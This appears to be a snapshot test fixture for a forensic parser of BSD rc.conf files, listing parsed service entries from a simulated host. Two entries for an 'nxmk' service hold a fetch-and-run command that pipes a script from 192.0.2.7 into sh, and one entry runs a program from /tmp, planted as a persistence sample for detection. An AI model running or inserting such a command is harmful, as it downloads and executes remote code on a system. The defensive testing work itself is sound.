@@ -1,0 +1,10 @@
+---
+source: crates/nixcavate-artifacts/src/bsd/rc.rs
+expression: out
+---
+{"host":"memory","artifact":"rc-conf","source_path":"etc/rc.conf","source_line":2,"variable":"hostname","value":"web1","kind":"setting","service":"","enabled":null,"script_path":"","command":""}
+{"host":"memory","artifact":"rc-conf","source_path":"etc/rc.conf","source_line":3,"variable":"sshd_enable","value":"YES","kind":"enable","service":"sshd","enabled":true,"script_path":"","command":""}
+{"host":"memory","artifact":"rc-conf","source_path":"etc/rc.conf","source_line":4,"variable":"nxmk_enable","value":"YES","kind":"enable","service":"nxmk","enabled":true,"script_path":"usr/local/etc/rc.d/nxmk","command":"/bin/sh -c 'curl -s http://192.0.2.7/x.sh | sh'"}
+{"host":"memory","artifact":"rc-conf","source_path":"etc/rc.conf","source_line":5,"variable":"nginx_enable","value":"NO","kind":"enable","service":"nginx","enabled":false,"script_path":"","command":""}
+{"host":"memory","artifact":"rc-conf","source_path":"etc/rc.conf","source_line":6,"variable":"nxmk_flags","value":"-v","kind":"flags","service":"nxmk","enabled":true,"script_path":"usr/local/etc/rc.d/nxmk","command":"/bin/sh -c 'curl -s http://192.0.2.7/x.sh | sh'"}
+{"host":"memory","artifact":"rc-conf","source_path":"etc/rc.conf","source_line":8,"variable":"foo_program","value":"/tmp/x","kind":"program","service":"foo","enabled":null,"script_path":"","command":"/tmp/x"}
